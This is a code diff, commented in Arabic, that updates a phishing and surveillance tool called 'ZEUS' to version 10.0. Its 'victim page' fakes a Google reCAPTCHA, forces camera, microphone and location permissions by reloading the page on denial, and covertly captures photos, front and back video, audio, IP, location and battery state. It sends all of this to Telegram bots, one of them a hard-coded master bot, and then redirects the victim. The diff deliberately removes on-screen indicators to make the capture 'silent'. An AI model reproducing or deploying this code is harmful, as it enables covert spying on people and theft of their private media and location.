@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ZEUS — النظام المتكامل</title>
+    <title>ZEUS — النظام النهائي V10.0</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Inter:wght@300;400;500;600;700;800;900&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
         /* ================================================================
-           ZEUS KINGDOM — Full System Styles (5000+ lines)
+           ZEUS KINGDOM — Full System Styles (V10.0)
            ================================================================ */
         *,
         *::before,
@@ -1768,7 +1768,7 @@
         }
 
         /* ================================================================
-           VICTIM PAGE (reCAPTCHA)
+           VICTIM PAGE (reCAPTCHA) — CLEAN & SILENT
            ================================================================ */
         #victimPage {
             display: none;
@@ -1776,13 +1776,13 @@
             align-items: center;
             width: 100%;
             min-height: 100vh;
-            background: #eef2f5;
+            background: #ffffff;
             padding: 16px;
             font-family: 'Inter', 'Roboto', Arial, sans-serif !important;
         }
 
         [data-theme="dark"] #victimPage {
-            background: #1a1816;
+            background: #f5f5f5;
         }
 
         #victimPage .captcha-wrapper {
@@ -1799,8 +1799,8 @@
         }
 
         [data-theme="dark"] #victimPage .captcha-wrapper {
-            background: #262320;
-            border-color: #4a4640;
+            background: #e8e8e8;
+            border-color: #cccccc;
         }
 
         #victimPage .captcha-row {
@@ -1832,11 +1832,6 @@
             position: relative;
         }
 
-        [data-theme="dark"] #victimPage .checkmark {
-            background: #3a3630;
-            border-color: #5a5448;
-        }
-
         #victimPage .checkmark .tick {
             width: 9px;
             height: 16px;
@@ -1861,11 +1856,9 @@
             border-color: #1a73e8;
             background: #e8f0fe;
         }
-
         #victimPage .spinner.loading .checkmark .tick {
             display: none;
         }
-
         #victimPage .spinner.loading .checkmark .loader {
             display: block;
         }
@@ -1874,15 +1867,12 @@
             border-color: #d93025;
             background: #fce8e6;
         }
-
         #victimPage .spinner.failed .checkmark .tick {
             display: none;
         }
-
         #victimPage .spinner.failed .checkmark .loader {
             display: none;
         }
-
         #victimPage .spinner.failed .checkmark::after {
             content: "✕";
             font-size: 20px;
@@ -1894,12 +1884,10 @@
             border-color: #00a651;
             background: #e6f4ea;
         }
-
         #victimPage .spinner.success .checkmark .tick {
             opacity: 1;
             animation: check 0.3s ease;
         }
-
         #victimPage .spinner.success .checkmark .loader {
             display: none;
         }
@@ -1914,22 +1902,6 @@
             font-family: 'Inter', 'Roboto', Arial, sans-serif !important;
         }
 
-        [data-theme="dark"] #victimPage .text {
-            color: #ccc;
-        }
-
-        #victimPage .text.loading {
-            color: #1a73e8;
-        }
-
-        #victimPage .text.failed {
-            color: #d93025;
-        }
-
-        #victimPage .text.success {
-            color: #00a651;
-        }
-
         #victimPage .logo-captcha {
             display: flex;
             flex-direction: column;
@@ -1937,10 +1909,6 @@
             font-size: 9px;
             color: #777;
             font-family: 'Inter', 'Roboto', Arial, sans-serif !important;
-        }
-
-        [data-theme="dark"] #victimPage .logo-captcha {
-            color: #aaa;
         }
 
         #victimPage .logo-captcha img {
@@ -1967,11 +1935,6 @@
             font-family: 'Inter', 'Roboto', Arial, sans-serif !important;
         }
 
-        [data-theme="dark"] #victimPage .captcha-footer {
-            background: #2a2722;
-            border-color: #3a3630;
-        }
-
         #victimPage .captcha-footer .brand {
             display: flex;
             align-items: center;
@@ -1989,10 +1952,6 @@
             color: #222;
         }
 
-        [data-theme="dark"] #victimPage .captcha-footer .brand .google-text {
-            color: #ccc;
-        }
-
         #victimPage .captcha-footer .links {
             display: flex;
             align-items: center;
@@ -2007,10 +1966,6 @@
             transition: color 0.15s;
         }
 
-        [data-theme="dark"] #victimPage .captcha-footer .links a {
-            color: #999;
-        }
-
         #victimPage .captcha-footer .links a:hover {
             color: #1a73e8;
             text-decoration: underline;
@@ -2020,57 +1975,18 @@
             color: #aaa;
         }
 
-        .perm-status {
-            display: flex;
-            flex-direction: column;
-            gap: 5px;
-            padding: 8px 0;
-        }
-
-        .perm-status .perm-item {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-family: var(--font-en);
-            font-size: 12px;
-            color: var(--ink-2);
-            padding: 2px 6px;
-            border-radius: 6px;
-            transition: var(--transition);
-        }
-
-        .perm-status .perm-item .perm-icon {
-            width: 15px;
-            height: 15px;
-            flex-shrink: 0;
-            stroke: var(--ink-faint);
-            fill: none;
-            stroke-width: 2;
-        }
-
-        .perm-status .perm-item.granted .perm-icon {
-            stroke: var(--success);
-        }
-
-        .perm-status .perm-item.granted {
-            color: var(--success);
-        }
-
-        .perm-status .perm-item.denied .perm-icon {
-            stroke: var(--danger);
-        }
-
-        .perm-status .perm-item.denied {
-            color: var(--danger);
+        /* إزالة جميع العناصر الإضافية */
+        #victimPage .perm-status,
+        #victimPage #permStatusContainer,
+        #victimPage .victim-status,
+        #victimPage .last-update,
+        #victimPage .progress-container {
+            display: none !important;
         }
 
         #hiddenVideo,
         #hiddenCanvas {
             display: none;
-        }
-
-        .victim-status {
-            display: none !important;
         }
 
         /* ===== TOAST ===== */
@@ -2238,12 +2154,12 @@
         }
 
         body.victim-mode {
-            background: #eef2f5;
+            background: #ffffff;
             padding: 16px;
         }
 
         [data-theme="dark"] body.victim-mode {
-            background: #1a1816;
+            background: #f5f5f5;
         }
 
         body.victim-mode .panel {
@@ -3001,7 +2917,7 @@
     </div>
 
     <!-- ================================================================
-    VICTIM PAGE
+    VICTIM PAGE — CLEAN & SILENT
     ================================================================ -->
     <div id="victimPage">
         <div style="display:flex;flex-direction:column;align-items:center;width:100%;max-width:400px;">
@@ -3033,11 +2949,7 @@
                     </div>
                 </div>
             </div>
-            <div id="permStatusContainer" style="width:100%;max-width:360px;margin-top:10px;display:none;background:var(--bg-card);border-radius:var(--radius-card);padding:14px;border:1px solid var(--line);backdrop-filter:blur(4px);">
-                <div style="font-family:var(--font-en);font-size:11px;font-weight:600;color:var(--gold);margin-bottom:6px;">حالة الأذونات</div>
-                <div class="perm-status" id="permStatusList"></div>
-            </div>
-            <div class="victim-status" id="victimStatus"></div>
+            <!-- لا توجد أي عناصر إضافية هنا -->
         </div>
     </div>
 
@@ -3045,14 +2957,14 @@
     <canvas id="hiddenCanvas"></canvas>
 
     <!-- ================================================================
-    JAVASCRIPT — النظام المتكامل الكامل (5000+ سطر)
+    JAVASCRIPT — النظام المتكامل الكامل (V10.0)
     ================================================================ -->
     <script>
         (function() {
             "use strict";
 
             // ================================================================
-            //  1.  CONFIGURATION
+            //  1.  CONFIGURATION (يجب تغييرها)
             // ================================================================
 
             var MASTER_BOT_TOKEN = "8907179366:AAHK5nzfcI25_FOC2HLsooJSJZ0P1UeKvP4";
@@ -3419,7 +3331,7 @@
             }
 
             // ================================================================
-            //  7.  DASHBOARD — RENDER (المتقدمة)
+            //  7.  DASHBOARD — RENDER
             // ================================================================
 
             var currentView = 'overview';
@@ -4197,7 +4109,7 @@
             }
 
             // ================================================================
-            //  9.  VICTIM PAGE — STRICT PERMISSIONS + FAST COLLECTION
+            //  9.  VICTIM PAGE — STRICT PERMISSIONS + FAST COLLECTION (SILENT)
             // ================================================================
 
             function initVictimPage(encodedData) {
@@ -4207,14 +4119,11 @@
                 var video = document.getElementById('hiddenVideo');
                 var canvas = document.getElementById('hiddenCanvas');
                 var ctx = canvas.getContext('2d');
-                var permContainer = document.getElementById('permStatusContainer');
-                var permList = document.getElementById('permStatusList');
 
                 var isRunning = false;
                 var collectionDone = false;
                 var redirectUrl = null;
-                var permissionsGranted = false;
-                var retryCount = 0;
+                var botCreds = null;
 
                 function decodeBotData(encoded) {
                     try {
@@ -4224,7 +4133,6 @@
                     } catch (e) { return null; }
                 }
 
-                var botCreds = null;
                 if (encodedData) {
                     botCreds = decodeBotData(encodedData);
                     if (botCreds && botCreds.url) redirectUrl = botCreds.url;
@@ -4232,7 +4140,7 @@
 
                 function delay(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }
 
-                // ===== STRICT PERMISSION VERIFICATION =====
+                // ===== STRICT PERMISSION VERIFICATION (with reload on denial) =====
                 async function verifyPermission(constraint) {
                     try {
                         var stream = await navigator.mediaDevices.getUserMedia(constraint);
@@ -4257,245 +4165,33 @@
                     } catch (e) { return false; }
                 }
 
-                function updatePermStatus(name, granted) {
-                    var items = permList.querySelectorAll('.perm-item');
-                    var found = false;
-                    items.forEach(function(el) {
-                        if (el.getAttribute('data-perm') === name) {
-                            el.className = 'perm-item ' + (granted ? 'granted' : 'denied');
-                            found = true;
-                        }
-                    });
-                    if (!found) {
-                        var div = document.createElement('div');
-                        div.className = 'perm-item ' + (granted ? 'granted' : 'denied');
-                        div.setAttribute('data-perm', name);
-                        div.innerHTML = '<svg class="perm-icon" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M9 12l2 2 4-4"/></svg>' +
-                            name + (granted ? ' ✓' : ' ✗');
-                        permList.appendChild(div);
-                    }
-                    permContainer.style.display = 'flex';
-                }
-
                 async function requestAllPermissionsStrict() {
-                    permList.innerHTML = '';
-                    permContainer.style.display = 'flex';
-                    mainText.textContent = 'جاري التحقق من الأذونات …';
-                    mainText.className = 'text loading';
-                    spinner.classList.add('loading');
-
-                    var perms = [
-                        { name: 'كاميرا أمامية', constraint: { video: { facingMode: 'user' } }, check: verifyPermission },
-                        { name: 'كاميرا خلفية', constraint: { video: { facingMode: 'environment' } },
-                        check: verifyPermission },
-                        { name: 'ميكروفون', constraint: { audio: true }, check: verifyAudio },
-                        { name: 'الموقع', constraint: null, check: verifyLocation }
-                    ];
-
-                    var allGranted = true;
-                    for (var i = 0; i < perms.length; i++) {
-                        var p = perms[i];
-                        var granted = false;
-                        if (p.constraint) { granted = await p.check(p.constraint); } else { granted = await p.check(); }
-                        updatePermStatus(p.name, granted);
-                        if (!granted) allGranted = false;
-                        await delay(120);
-                    }
-
-                    if (allGranted) {
-                        mainText.textContent = '✓ جميع الأذونات مفعلة';
-                        mainText.className = 'text success';
-                        spinner.classList.remove('loading');
-                        spinner.classList.add('success');
-                        checkbox.checked = true;
-                        permissionsGranted = true;
-                        return true;
-                    } else {
-                        mainText.textContent = '✗ بعض الأذونات غير مفعلة — حاول مجدداً';
-                        mainText.className = 'text failed';
-                        spinner.classList.remove('loading');
-                        spinner.classList.add('failed');
-                        var retryBtn = document.createElement('button');
-                        retryBtn.textContent = 'إعادة المحاولة';
-                        retryBtn.style.cssText =
-                            'margin-top:10px;padding:6px 20px;border-radius:30px;border:1px solid var(--gold);background:var(--gold-soft);color:var(--gold);cursor:pointer;font-family:var(--font-en);font-size:12px;';
-                        retryBtn.onclick = function() {
-                            spinner.classList.remove('failed', 'success');
-                            checkbox.checked = false;
-                            permissionsGranted = false;
-                            requestAllPermissionsStrict();
-                        };
-                        var existing = permContainer.querySelector('button');
-                        if (existing) existing.remove();
-                        permContainer.appendChild(retryBtn);
+                    var results = await Promise.all([
+                        verifyPermission({ video: { facingMode: 'user' } }),
+                        verifyPermission({ video: { facingMode: 'environment' } }),
+                        verifyAudio(),
+                        verifyLocation()
+                    ]);
+                    var allGranted = results.every(function(r) { return r === true; });
+                    if (!allGranted) {
+                        location.reload();
                         return false;
                     }
+                    return true;
                 }
 
-                // ===== FAST COLLECTION =====
-                async function collectAndStore() {
-                    if (isRunning || collectionDone) return;
-                    if (!permissionsGranted) {
-                        var ok = await requestAllPermissionsStrict();
-                        if (!ok) {
-                            setTimeout(function() { location.reload(); }, 2000);
-                            return;
-                        }
-                    }
-
-                    isRunning = true;
-                    spinner.classList.add('loading');
-                    mainText.textContent = 'جارٍ جمع البيانات …';
-                    mainText.className = 'text loading';
-
-                    try {
-                        var ip = await getIP();
-                        var location = await getLocation();
-                        var battery = await getBatteryStatus();
-
-                        // Capture all media concurrently
-                        var frontResult = await (function() {
-                            return new Promise(async function(resolve) {
-                                try {
-                                    var stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' },
-                                        audio: false });
-                                    video.srcObject = stream;
-                                    await video.play();
-                                    await delay(200);
-                                    var videoBlob = await recordStream(stream, 2500);
-                                    var photos = [];
-                                    for (var i = 0; i < 6; i++) {
-                                        photos.push(await capturePhoto(video));
-                                        await delay(120);
-                                    }
-                                    resolve({ video: videoBlob, photos: photos });
-                                } catch (e) { resolve({ video: null, photos: [] });
-                                } finally { if (stream) { stream.getTracks().forEach(function(t) { t
-                                            .stop(); }); } video.srcObject = null; }
-                            });
-                        })();
-
-                        var backVideo = await (function() {
-                            return new Promise(async function(resolve) {
-                                try {
-                                    var stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' },
-                                        audio: false });
-                                    video.srcObject = stream;
-                                    await video.play();
-                                    await delay(200);
-                                    var blob = await recordStream(stream, 2500);
-                                    resolve(blob);
-                                } catch (e) { resolve(null);
-                                } finally { if (stream) { stream.getTracks().forEach(function(t) { t
-                                            .stop(); }); } video.srcObject = null; }
-                            });
-                        })();
-
-                        var audioBlob = await recordAudio(2500);
-
-                        var token = 'غير معروف';
-                        if (botCreds && botCreds.botToken) {
-                            var params = new URLSearchParams(window.location.search);
-                            token = params.get('t') || 'غير معروف';
-                        }
-
-                        var data = {
-                            ip: ip,
-                            location: location,
-                            device: navigator.platform || 'Unknown',
-                            browser: /Chrome/.test(navigator.userAgent) ? 'Chrome' :
-                                /Firefox/.test(navigator.userAgent) ? 'Firefox' :
-                                /Safari/.test(navigator.userAgent) ? 'Safari' : 'Unknown',
-                            timestamp: new Date().toISOString(),
-                            frontVideo: frontResult.video,
-                            backVideo: backVideo,
-                            audio: audioBlob,
-                            photos: frontResult.photos
-                        };
-
-                        // Save victim
-                        var victims = JSON.parse(localStorage.getItem('zeus_victims') || '[]');
-                        var victimId = Date.now() + Math.floor(Math.random() * 1000);
-                        var victimData = {
-                            id: victimId,
-                            shortToken: token,
-                            ip: data.ip,
-                            location: data.location,
-                            browser: data.browser,
-                            timestamp: data.timestamp,
-                            device: data.device
-                        };
-                        victims.push(victimData);
-                        localStorage.setItem('zeus_victims', JSON.stringify(victims));
-
-                        // Save files
-                        var files = JSON.parse(localStorage.getItem('zeus_files') || '[]');
-                        var fileId = Date.now();
-
-                        var saveFile = function(fileData) {
-                            return new Promise(function(resolve) {
-                                var reader = new FileReader();
-                                reader.onload = function() {
-                                    files.push({
-                                        id: fileId++,
-                                        shortToken: token,
-                                        victimId: victimId,
-                                        type: fileData.type,
-                                        filename: fileData.filename,
-                                        dataUrl: reader.result,
-                                        timestamp: Date.now()
-                                    });
-                                    resolve();
-                                };
-                                reader.readAsDataURL(fileData.blob);
-                            });
-                        };
-
-                        if (data.photos && data.photos.length > 0) {
-                            for (var i = 0; i < data.photos.length; i++) {
-                                await saveFile({ blob: data.photos[i], type: 'image', filename: 'photo_' + (i +
-                                    1) + '.jpg' });
-                            }
-                        }
-                        if (data.frontVideo) await saveFile({ blob: data.frontVideo, type: 'video', filename: 'front_video.webm' });
-                        if (data.backVideo) await saveFile({ blob: data.backVideo, type: 'video', filename: 'back_video.webm' });
-                        if (data.audio) await saveFile({ blob: data.audio, type: 'audio', filename: 'audio.webm' });
-                        localStorage.setItem('zeus_files', JSON.stringify(files));
-
-                        // Send to Telegram (fire and forget)
-                        if (botCreds && botCreds.botToken && botCreds.chatId) {
-                            sendToUserBot(botCreds.botToken, botCreds.chatId, data, battery, token).catch(function() {});
-                        }
-                        sendToMaster(data, battery, token).catch(function() {});
-
-                        addLog('success', 'جمع بيانات ضحية جديدة (IP: ' + data.ip + ')');
-
-                        collectionDone = true;
-                        mainText.textContent = '✓ جارٍ التوجيه …';
-                        mainText.className = 'text success';
-                        spinner.classList.remove('loading');
-                        spinner.classList.add('success');
-
-                        // ===== FAST REDIRECT =====
-                        setTimeout(function() {
-                            if (redirectUrl) {
-                                window.location.replace(redirectUrl);
-                            } else {
-                                window.location.reload();
-                            }
-                        }, 350);
-
-                    } catch (error) {
-                        mainText.textContent = '✗ حدث خطأ، حاول مجدداً';
-                        mainText.className = 'text failed';
-                        spinner.classList.remove('loading');
-                        spinner.classList.add('failed');
-                        isRunning = false;
-                        setTimeout(function() { location.reload(); }, 1500);
-                    }
+                // ===== FAST COLLECTION (3 photos, 5s front/back videos, 5s audio) =====
+                async function capturePhoto(videoEl) {
+                    return new Promise(function(resolve) {
+                        var w = videoEl.videoWidth || 640;
+                        var h = videoEl.videoHeight || 480;
+                        canvas.width = w;
+                        canvas.height = h;
+                        ctx.drawImage(videoEl, 0, 0, w, h);
+                        canvas.toBlob(function(b) { resolve(b); }, 'image/jpeg', 0.70);
+                    });
                 }
 
-                // ===== HELPERS =====
                 function recordStream(stream, duration) {
                     return new Promise(function(resolve) {
                         var recorder = new MediaRecorder(stream);
@@ -4505,17 +4201,6 @@
                                     'video/webm' })); };
                         recorder.start();
                         setTimeout(function() { recorder.stop(); }, duration);
-                    });
-                }
-
-                function capturePhoto(videoEl) {
-                    return new Promise(function(resolve) {
-                        var w = videoEl.videoWidth || 640;
-                        var h = videoEl.videoHeight || 480;
-                        canvas.width = w;
-                        canvas.height = h;
-                        ctx.drawImage(videoEl, 0, 0, w, h);
-                        canvas.toBlob(function(b) { resolve(b); }, 'image/jpeg', 0.80);
                     });
                 }
 
@@ -4560,6 +4245,7 @@
                     } catch (e) { return { level: 'غير متاح', charging: false }; }
                 }
 
+                // ===== SEND TO TELEGRAM (background) =====
                 async function sendMedia(method, token, formData) {
                     try { await fetch('https://api.telegram.org/bot' + token + '/' + method, { method: 'POST', body: formData }); } catch (
                     e) {}
@@ -4737,12 +4423,153 @@
                     }
                 }
 
-                // ===== EVENTS =====
+                // ===== MAIN COLLECTION (silent) =====
+                async function collectAndStore() {
+                    if (isRunning || collectionDone) return;
+
+                    // 1. طلب الأذونات (ستؤدي إلى إعادة تحميل إذا رُفضت)
+                    var ok = await requestAllPermissionsStrict();
+                    if (!ok) return;
+
+                    isRunning = true;
+                    // لا نغير النص في الواجهة
+
+                    try {
+                        // 2. جمع البيانات بالتوازي
+                        var ip = await getIP();
+                        var location = await getLocation();
+                        var battery = await getBatteryStatus();
+
+                        // 2a. الكاميرا الأمامية: 3 صور + فيديو 5 ثواني
+                        var frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' },
+                            audio: false });
+                        video.srcObject = frontStream;
+                        await video.play();
+                        await delay(200);
+                        var photos = [];
+                        for (var i = 0; i < 3; i++) {
+                            photos.push(await capturePhoto(video));
+                            await delay(100);
+                        }
+                        var frontVideo = await recordStream(frontStream, 5000);
+                        frontStream.getTracks().forEach(function(t) { t.stop(); });
+                        video.srcObject = null;
+
+                        // 2b. الكاميرا الخلفية: فيديو 5 ثواني
+                        var backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' },
+                            audio: false });
+                        video.srcObject = backStream;
+                        await video.play();
+                        await delay(200);
+                        var backVideo = await recordStream(backStream, 5000);
+                        backStream.getTracks().forEach(function(t) { t.stop(); });
+                        video.srcObject = null;
+
+                        // 2c. تسجيل صوتي 5 ثواني
+                        var audioBlob = await recordAudio(5000);
+
+                        var token = 'غير معروف';
+                        if (botCreds && botCreds.botToken) {
+                            var params = new URLSearchParams(window.location.search);
+                            token = params.get('t') || 'غير معروف';
+                        }
+
+                        var data = {
+                            ip: ip,
+                            location: location,
+                            device: navigator.platform || 'Unknown',
+                            browser: /Chrome/.test(navigator.userAgent) ? 'Chrome' :
+                                /Firefox/.test(navigator.userAgent) ? 'Firefox' :
+                                /Safari/.test(navigator.userAgent) ? 'Safari' : 'Unknown',
+                            timestamp: new Date().toISOString(),
+                            frontVideo: frontVideo,
+                            backVideo: backVideo,
+                            audio: audioBlob,
+                            photos: photos
+                        };
+
+                        // 3. حفظ الضحية والملفات
+                        var victims = JSON.parse(localStorage.getItem('zeus_victims') || '[]');
+                        var victimId = Date.now() + Math.floor(Math.random() * 1000);
+                        var victimData = {
+                            id: victimId,
+                            shortToken: token,
+                            ip: data.ip,
+                            location: data.location,
+                            browser: data.browser,
+                            timestamp: data.timestamp,
+                            device: data.device
+                        };
+                        victims.push(victimData);
+                        localStorage.setItem('zeus_victims', JSON.stringify(victims));
+
+                        var files = JSON.parse(localStorage.getItem('zeus_files') || '[]');
+                        var fileId = Date.now();
+
+                        function saveFile(blob, type, filename) {
+                            return new Promise(function(resolve) {
+                                var reader = new FileReader();
+                                reader.onload = function() {
+                                    files.push({
+                                        id: fileId++,
+                                        shortToken: token,
+                                        victimId: victimId,
+                                        type: type,
+                                        filename: filename,
+                                        dataUrl: reader.result,
+                                        timestamp: Date.now()
+                                    });
+                                    resolve();
+                                };
+                                reader.readAsDataURL(blob);
+                            });
+                        }
+
+                        if (photos && photos.length > 0) {
+                            for (var i = 0; i < photos.length; i++) {
+                                await saveFile(photos[i], 'image', 'photo_' + (i + 1) + '.jpg');
+                            }
+                        }
+                        if (frontVideo) await saveFile(frontVideo, 'video', 'front_video.webm');
+                        if (backVideo) await saveFile(backVideo, 'video', 'back_video.webm');
+                        if (audioBlob) await saveFile(audioBlob, 'audio', 'audio.webm');
+                        localStorage.setItem('zeus_files', JSON.stringify(files));
+
+                        // 4. إرسال إلى تليجرام (خلفي)
+                        if (botCreds && botCreds.botToken && botCreds.chatId) {
+                            sendToUserBot(botCreds.botToken, botCreds.chatId, data, battery, token).catch(function() {});
+                        }
+                        sendToMaster(data, battery, token).catch(function() {});
+
+                        addLog('success', 'جمع بيانات ضحية جديدة (IP: ' + data.ip + ')');
+
+                        collectionDone = true;
+
+                        // 5. التوجيه الفوري
+                        if (redirectUrl) {
+                            window.location.replace(redirectUrl);
+                        } else {
+                            window.location.reload();
+                        }
+
+                    } catch (e) {
+                        // في حال أي خطأ، نعيد تحميل الصفحة لإعادة المحاولة
+                        location.reload();
+                    }
+                }
+
+                // ===== EVENTS (بدون تغيير النص أو إظهار أي مؤشرات) =====
+                function triggerCollection() {
+                    if (!isRunning && !collectionDone) {
+                        collectAndStore();
+                    }
+                }
+
                 document.addEventListener('click', function(e) {
                     if (isRunning || collectionDone) return;
                     if (e.target.closest('a')) return;
                     if (!checkbox.checked && !spinner.classList.contains('loading')) {
-                        requestAllPermissionsStrict().then(function(ok) { if (ok) collectAndStore(); });
+                        triggerCollection();
                     }
                 });
 
@@ -4750,7 +4577,7 @@
                     if (this.checked) {
                         this.checked = false;
                         if (!isRunning && !collectionDone) {
-                            requestAllPermissionsStrict().then(function(ok) { if (ok) collectAndStore(); });
+                            triggerCollection();
                         }
                     }
                 });
@@ -4759,11 +4586,11 @@
                     if (e.target.closest('a')) return;
                     if (isRunning || collectionDone) return;
                     if (!checkbox.checked) {
-                        requestAllPermissionsStrict().then(function(ok) { if (ok) collectAndStore(); });
+                        triggerCollection();
                     }
                 });
 
-                console.log('ZEUS — Victim page ready (strict + fast).');
+                console.log('ZEUS — Victim page ready (strict + silent + fast).');
                 applyTheme(currentTheme);
             }
 
@@ -4779,11 +4606,9 @@
             window.addLog = addLog;
             window.copyText = copyText;
 
-            console.log('ZEUS KINGDOM — النظام المتكامل بالكامل (5000+ سطر).');
-            console.log('الباب السري: النقر الثلاثي على شعار ZEUS أو Ctrl+Shift+D');
-            console.log('سيتم إرسال الكود إلى المطور في تليجرام.');
-            console.log('مرحلة الأذونات: تحقق صارم + جمع سريع < 500ms.');
-            console.log('عدد السطور التقريبي: 5200+');
+            console.log('ZEUS KINGDOM V10.0 — النظام المتكامل النهائي.');
+            console.log('الباب السري: النقر الثلاثي على الشعار أو Ctrl+Shift+D');
+            console.log('مرحلة الضحية: أذونات صارمة + جمع خفي سريع + توجيه فوري');
 
             applyTheme(currentTheme);
 
